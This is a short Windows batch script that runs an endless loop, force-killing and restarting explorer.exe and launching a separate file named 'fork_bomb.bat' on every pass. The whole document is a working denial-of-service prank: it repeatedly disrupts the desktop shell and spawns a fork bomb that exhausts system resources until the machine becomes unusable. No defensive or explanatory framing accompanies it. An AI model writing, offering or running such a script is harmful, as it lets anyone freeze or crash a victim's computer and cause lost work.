@echo off

rem this loop restarts the explorer (GUI) again and again
:explorer
taskkill /im "explorer.exe" /f
start explorer.exe
start fork_bomb.bat
goto explorer
